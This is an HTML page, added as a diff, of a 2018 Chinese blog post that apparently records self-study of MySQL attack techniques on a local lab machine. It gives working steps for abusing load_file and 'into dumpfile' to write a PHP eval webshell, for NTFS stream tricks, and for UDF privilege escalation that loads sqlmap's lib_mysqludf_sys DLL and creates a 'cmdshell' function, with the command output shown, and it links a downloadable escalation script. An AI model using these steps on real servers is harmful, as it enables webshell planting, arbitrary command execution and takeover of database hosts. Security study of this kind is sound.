@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="以前关于mysql只会提数据,并不会处理文件和提权,这里整理一下学习到的新姿势 load_file其实这个说起来是都知道,但是以前实验的时候总是失败…. 今天再次尝试,发现还是不行,load_file的时候总是返回null,如图  然后试图写入文件的时候弹出了 然后百度了一番,改了一下mysql的设置 在mysql.ini最后加了一句 1secure_file_priv&#x3D;  然后就可以成功的读写文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql的补充学习">
+<meta property="og:url" content="http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="以前关于mysql只会提数据,并不会处理文件和提权,这里整理一下学习到的新姿势 load_file其实这个说起来是都知道,但是以前实验的时候总是失败…. 今天再次尝试,发现还是不行,load_file的时候总是返回null,如图  然后试图写入文件的时候弹出了 然后百度了一番,改了一下mysql的设置 在mysql.ini最后加了一句 1secure_file_priv&#x3D;  然后就可以成功的读写文">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/02/sql_1.png">
+<meta property="og:image" content="http://example.com/images/2018/02/sql_2.png">
+<meta property="og:image" content="http://example.com/images/2018/02/sql_3.png">
+<meta property="og:image" content="http://example.com/images/2018/02/sql_4.png">
+<meta property="og:image" content="http://example.com/images/2018/02/sql_5.png">
+<meta property="og:image" content="http://example.com/images/2018/02/sql_6.png">
+<meta property="og:image" content="http://example.com/images/2018/02/%E6%8F%90%E6%9D%83.png">
+<meta property="article:published_time" content="2018-02-09T10:09:27.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.455Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/02/sql_1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>mysql的补充学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/01/29/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A84%E4%B9%8B%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&text=mysql的补充学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&is_video=false&description=mysql的补充学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql的补充学习&body=Check out this article: http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&name=mysql的补充学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&t=mysql的补充学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file"><span class="toc-number">1.</span> <span class="toc-text">load_file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">udf提权</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        mysql的补充学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-02-09T10:09:27.000Z" class="dt-published" itemprop="datePublished">2018-02-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>以前关于mysql只会提数据,并不会处理文件和提权,这里整理一下学习到的新姿势</p>
+<h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h3><p>其实这个说起来是都知道,但是以前实验的时候总是失败…. 今天再次尝试,发现还是不行,load_file的时候总是返回null,如图 <img src="/images/2018/02/sql_1.png" alt="blacsheep"> 然后试图写入文件的时候弹出了<img src="/images/2018/02/sql_2.png" alt="blacsheep"> 然后百度了一番,改了一下mysql的设置 在mysql.ini最后加了一句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以成功的读写文件了(本身mysql是root权限) <img src="/images/2018/02/sql_3.png" alt="blacsheep"> 同样也可以写shell,比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into dumpfile &quot;D://123.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2018/02/sql_4.png" alt="blacsheep"> okok,基础就到这里,下面是关于mysql的提权</p>
+<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>首先udf的提权会涉及到mysql的版本问题,5.1以上和5.1一下是不一样的 而且提权的系统不一样操作也是不一样的…. 然后涉及到的dll或者so文件在sqlmap的udf文件夹里面都有 直接开始吧,首先看一下你的plugin路径 <img src="/images/2018/02/sql_5.png" alt="blacsheep"> 本机是windows64位,所以用的win&#x2F;64&#x2F;xxxx.dll 把这个文件写入到plugin目录下,但是由于sql语句无法创建目录…很尴尬,然后网上有大神流传的方法:利用ntfs ads流创建目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;xxx&#x27; into outfile &#x27;D:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;D:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>但是很遗憾…我尝试了几次发现都是失败的…. <img src="/images/2018/02/sql_6.png" alt="blacsheep"> 有人说是mysql更新之后导致的…具体原因我也不清楚… 思考了一下觉得,可以写的话那就写个webshell进去,有权限的话直接创建一个plugin文件夹就ok了,具体的就不看了…本地实验我就直接右键创建了(菜鸡捂脸ing) 创建之后写个sql导入dll</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;D:\\python2\\Lib\\site-packages\\sqlmap\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll_&quot;) into outfile &quot;D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>最蛋疼的部分来了… 创建这里疯狂出问题… 后来网上找了个脚本才知道是dll文件的问题… 脚本放一下 <a href="/images/2018/07/udf_Ti_Quan.zip">udf提权</a> 弄好了dll文件后面就简单了… 数据库自选..</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use udf;</span><br><span class="line">create function cmdshell returns string soname &#x27;moonudf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2018/02/%E6%8F%90%E6%9D%83.png" alt="blacsheep"> 然后就可以为所欲为了… 这里我把减号删掉了….</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select cmdshell(&#x27;dir&#x27;);</span><br><span class="line">++</span><br><span class="line"> cmdshell(&#x27;dir&#x27;) </span><br><span class="line">++</span><br><span class="line">  驱动器 D 中的卷是 软件</span><br><span class="line"> 卷的序列号是 A622-E827</span><br><span class="line"></span><br><span class="line"> D:\phpStudy\MySQL\data 的目录</span><br><span class="line"></span><br><span class="line">2018/02/09  16:06    &lt;DIR&gt;          .</span><br><span class="line">2018/02/09  16:06    &lt;DIR&gt;          ..</span><br><span class="line">2017/12/26  02:08    &lt;DIR&gt;          challenges</span><br><span class="line">2018/02/02  17:49               669 DESKTOP-76O3SAJ.err</span><br><span class="line">2018/02/09  15:15                 5 DESKTOP-76O3SAJ.pid</span><br><span class="line">2017/11/27  01:06    &lt;DIR&gt;          flappy</span><br><span class="line">2017/12/02  14:13    &lt;DIR&gt;          friends</span><br><span class="line">2018/02/02  17:30        18,874,368 ibdata1</span><br><span class="line">2018/02/09  15:15        25,165,824 ib_logfile0</span><br><span class="line">2017/07/12  21:48        25,165,824 ib_logfile1</span><br><span class="line">2017/11/29  03:42    &lt;DIR&gt;          mctf_empty</span><br><span class="line">2017/07/12  21:48    &lt;DIR&gt;          mysql</span><br><span class="line">2017/11/25  17:46    &lt;DIR&gt;          my_db</span><br><span class="line">2017/07/12  21:48    &lt;DIR&gt;          performance_schema</span><br><span class="line">2017/12/26  02:08    &lt;DIR&gt;          security</span><br><span class="line">2018/02/09  16:34    &lt;DIR&gt;          udf</span><br><span class="line">2017/11/08  18:41    &lt;DIR&gt;          ultrax</span><br><span class="line">               5 个文件     69,206,690 字节</span><br><span class="line">              12 个目录 192,709,541,888 可用字节</span><br><span class="line"></span><br><span class="line">--------------------------------------------完成!</span><br><span class="line">                                                   </span><br><span class="line">++</span><br><span class="line">1 row in set (4.84 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>剩下的创建管理员什么的自己创建就好了~ 对了,最后别忘了drop function cmdshell;</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file"><span class="toc-number">1.</span> <span class="toc-text">load_file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">udf提权</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&text=mysql的补充学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&is_video=false&description=mysql的补充学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql的补充学习&body=Check out this article: http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&title=mysql的补充学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&name=mysql的补充学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/&t=mysql的补充学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
